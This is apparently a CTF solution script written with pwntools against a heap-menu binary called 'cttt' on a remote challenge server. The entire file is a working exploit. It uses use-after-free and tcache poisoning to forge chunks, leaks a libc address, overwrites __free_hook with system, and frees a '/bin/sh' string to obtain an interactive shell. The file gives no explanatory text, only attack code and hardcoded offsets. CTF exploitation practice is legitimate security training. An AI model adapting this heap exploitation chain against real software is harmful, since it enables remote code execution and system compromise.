from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./cttt')
	raw_input('debug')
	free_hook = 0x3ed8e8
	offset = 96 + 16 + 0x3ebc30
	system_offset = 0x4f4e0
else:
	host, port = 'challenges.ctfd.io', 30252
	r = remote(host, port)
	free_hook = 0x3ed8e8
	offset = 96 + 16 + 0x3ebc30
	system_offset = 0x4f440

urls_add = 0x404040 

def add():
	r.sendlineafter('> ', '1')

def edit(ind, payload):
	r.sendlineafter('> ', '2')
	r.sendlineafter('Tracker tracker number?', str(ind))
	r.sendlineafter('New tracker tracker URL?',payload)
	
def delete(ind):
	r.sendlineafter('> ', '3')
	r.sendlineafter('Tracker tracker number?', str(ind))
	
def list():
	r.sendlineafter('> ', '4')
	
add()
add()

delete(1)
delete(2)

payload = p64(urls_add+0x50)
edit(2, payload)

add()
add()
payload = p64(0) + p64(urls_add+0x70) + p64(0) + p64(0x121)
payload = payload.ljust(0x40-1,'\x00')

for i in range(7):
	edit(4,payload)
	delete(12)

edit(4,payload)
delete(1)
delete(2)
payload = p64(urls_add+0x188)
edit(2, payload)
add()
add()
payload = p64(0x21) + p64(0x0)*3 + p64(0x21)
edit(6,payload)

# raw_input()
payload = p64(0) + p64(urls_add+0x70) + p64(0) + p64(0x121)
payload = payload.ljust(0x40-1,'\x00')
edit(4, payload)
delete(1)
delete(2)
payload = p64(urls_add+0x80)
edit(2, payload)
add()
add()
payload = p64(0)*2
edit(8,payload)

# raw_input()
delete(12)
payload = p64(0) + p32(0x010101) + p32(0x01010101)
edit(8,payload)
list()
r.recvuntil('12) ')
res = u64(r.recv(6) + '\x00'*2)
libc_base = res - offset
log.info('%#x' %libc_base)
free_hook_add = libc_base + free_hook

delete(1)
delete(2)
payload = p64(free_hook_add)
edit(2, payload)
add()
add()
payload = p64(libc_base + system_offset )
edit(10,payload)
edit(3,"/bin/sh\x00")
delete(3)

r.interactive()
r.close()

# FLAG